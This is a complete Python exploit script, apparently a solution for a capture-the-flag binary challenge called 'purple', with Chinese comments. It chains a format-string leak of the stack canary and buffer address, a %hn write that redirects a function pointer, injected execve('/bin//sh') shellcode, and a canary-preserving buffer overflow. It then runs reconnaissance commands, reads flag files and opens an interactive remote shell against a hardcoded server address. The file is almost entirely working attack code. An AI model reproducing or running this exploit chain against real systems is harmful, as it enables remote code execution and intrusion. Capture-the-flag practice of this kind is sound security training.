#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
purple / 老东西，你的替身是最没用哒！ —— 纯 Python3 利用脚本（无 pwntools，无第三方依赖）

用法:
    python3 solve.py                 # 打远程  110.42.112.160:38505
    python3 solve.py HOST PORT       # 自定义远程
    python3 solve.py HOST:PORT       # 同上
    python3 solve.py local           # 本地测试（用题目自带的 ld-2.36 + libc-2.36）

漏洞链:
    1. printf(format, format, 0x41) 第一次  -> %1$p 泄漏 &format(=rbp-0x210), %73$p 泄漏 canary
    2. printf 第二次                        -> %hn 把 print_job(0x004011b6) 低 16 位改成 0x6000
                                               => 0x00406000 = shell_area
    3. read_exact(shell_area, 1024)         -> 注入 shellcode (mprotect 成 R-X)
    4. sign_note 的 read_exact(note[64], 80) 越界 -> 72 填充 + canary（canary 在第 72..79 字节）
    5. call [rbp-0x220]                     -> execve("/bin//sh")
"""
import re
import socket
import struct
import sys
import os
import select
import subprocess

HOST, PORT = "110.42.112.160", 38505
# execve("/bin//sh", 0, 0):
#   xor rsi,rsi; push rsi; movabs rdi,0x68732f2f6e69622f; push rdi; push rsp; pop rdi
#   push 0x3b; pop rax; cdq; syscall
SHELLCODE = bytes.fromhex("4831f65648bf2f62696e2f2f736857545f6a3b58990f05")


def p64(x):
    return struct.pack("<Q", x & 0xFFFFFFFFFFFFFFFF)


def log(*a):
    print("[*]", *a)
    sys.stdout.flush()


class IO:
    """本地子进程 / 远程 socket 的统一读写接口，带内部缓冲，保证按行/按标记精确读取。"""

    def __init__(self, local=False, host=HOST, port=PORT):
        self.local = local
        self._buf = b""
        if local:
            here = os.path.dirname(os.path.abspath(__file__))
            try:
                self.proc = subprocess.Popen(
                    ["./ld-linux-x86-64.so.2", "--library-path", here, "./purple"],
                    cwd=here,
                    stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                    stderr=subprocess.DEVNULL,
                )
            except (PermissionError, FileNotFoundError) as e:
                sys.exit("本地起进程失败: %s\n"
                         "请先 chmod +x purple ld-linux-x86-64.so.2（或把整个目录 cp 到 ~/ 再跑），"
                         "也可以直接打远程: python3 solve.py" % e)
            self._wfd = self.proc.stdin.fileno()
            self._rfd = self.proc.stdout.fileno()
        else:
            self.sock = socket.create_connection((host, port))
            self._wfd = self.sock.fileno()
            self._rfd = self.sock.fileno()

    def send(self, data):
        os.write(self._wfd, data)

    def _fill(self):
        d = os.read(self._rfd, 4096)
        if not d:
            raise EOFError("连接已关闭")
        self._buf += d

    def readline(self):
        while b"\n" not in self._buf:
            self._fill()
        i = self._buf.index(b"\n") + 1
        line, self._buf = self._buf[:i], self._buf[i:]
        return line

    def recv_until(self, mark):
        while mark not in self._buf:
            self._fill()
        i = self._buf.index(mark) + len(mark)
        out, self._buf = self._buf[:i], self._buf[i:]
        return out

    def drain(self):
        out, self._buf = self._buf, b""
        return out


def interact(io):
    rfd = io._rfd
    os.write(1, io.drain())
    while True:
        try:
            rr, _, _ = select.select([rfd, 0], [], [])
        except (OSError, ValueError):
            return
        if rfd in rr:
            d = os.read(rfd, 4096)
            if not d:
                break
            os.write(1, d)
        if 0 in rr:
            d = os.read(0, 4096)
            if not d:
                break
            io.send(d)


def exploit(io):
    # 1) 泄漏 &format / canary
    io.recv_until("第一句".encode())
    io.send(b"%1$p.%73$p\n")
    line = b""
    while True:
        line = io.readline()
        if b"0x" in line:
            break
    m = re.search(rb"(0x[0-9a-fA-F]+)\.(0x[0-9a-fA-F]+)", line)
    if not m:
        m = re.findall(rb"0x[0-9a-fA-F]+", line)
        fmt, can = (int(x, 16) for x in m[:2])
    else:
        fmt, can = int(m.group(1), 16), int(m.group(2), 16)
    log("&format = %#x" % fmt)
    log("canary  = %#x" % can)
    if can & 0xFF:
        log("警告: canary 末字节不是 00，可能泄漏错了，继续前请确认")

    # 2) 改写 print_job: 0x004011b6 -> 0x00406000（只动低 16 位 0x11b6 -> 0x6000）
    #    "%1$24576c%10$hnA" 共 16 字节, 地址落在 format[16], 是第 10 个可变参数
    p2 = b"%1$24576c%10$hnA" + p64(fmt - 0x10) + b"\n"
    io.send(p2)
    io.recv_until("请写入".encode())     # 顺便吃掉 ~24KB 的 %c 输出
    log("print_job -> 0x406000")

    # 3) shellcode(正好 1024) + 签名页(正好 80 = 72 填充 + canary)
    sc = SHELLCODE.ljust(1024, b"\x90")
    note = b"A" * 72 + p64(can)
    io.send(sc + note)

    # 4) 先自动侦察 + 读 flag，然后转交交互（你可以继续敲命令）
    io.send(b"id; ls -la /; cat /flag* 2>/dev/null; echo ===DONE===\n")
    log("已进入 shell，输出如下，继续敲命令即可（Ctrl-C 退出）")
    interact(io)


if __name__ == "__main__":
    args = sys.argv[1:]
    if "local" in args:
        log("本地模式（ld-2.36 / libc-2.36）")
        io = IO(local=True)
    else:
        host, port = HOST, PORT
        for a in args:
            if ":" in a:
                host, port = a.split(":")
                port = int(port)
            elif a.isdigit():
                port = int(a)
            else:
                host = a
        log("目标 %s:%d" % (host, port))
        io = IO(host=host, port=port)
    try:
        exploit(io)
    except KeyboardInterrupt:
        print()
    except EOFError as e:
        log("连接中断: %s" % e)
